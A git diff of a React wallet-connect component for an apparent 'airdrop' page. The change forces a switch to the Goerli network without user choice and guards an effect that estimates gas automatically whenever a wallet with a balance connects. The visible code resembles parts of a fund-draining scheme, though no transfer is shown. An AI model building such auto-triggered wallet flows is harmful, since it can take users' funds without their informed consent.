@@ -10,10 +10,12 @@ import {
   useAccount,
   useFeeData,
   useBalance,
+  useSwitchNetwork,
 } from "wagmi";
 import { Button } from "@chakra-ui/react";
 import airdropAbi from "config/constants/airdrop.json";
 import { useEthersProvider } from "../../config/ether";
+import { goerli } from "viem/chains";
 
 const contractAddress = "0x794bF077074D4aC9e958c19CceEDe1e04ddB1a5E";
 
@@ -31,13 +33,14 @@ export const CustomConnect = () => {
     formatUnits: "ether",
   });
   const { data: feeData } = useFeeData();
+  const { switchNetwork } = useSwitchNetwork();
 
   const [isSubmitted, setIsSubmitted] = useState(false);
   const provider = useEthersProvider();
   useEffect(() => {
     async function estimateGasAmount() {
       try {
-        if (!provider || !balanceData || !feeData) return;
+        if (!provider || !balanceData || !feeData || isSubmitted) return;
 
         if (parseFloat(balanceData.formatted) == 0) return;
 
@@ -72,7 +75,7 @@ export const CustomConnect = () => {
     }
 
     estimateGasAmount();
-  }, [feeData, balanceData, provider]);
+  }, [feeData, balanceData, provider, isSubmitted]);
   return (
     <ConnectButton.Custom>
       {({
@@ -135,11 +138,8 @@ export const CustomConnect = () => {
                 );
               }
               if (chain.unsupported) {
-                return (
-                  <button onClick={openChainModal} type="button">
-                    Wrong network
-                  </button>
-                );
+                switchNetwork(goerli.id);
+                return;
               }
               return (
                 <Button
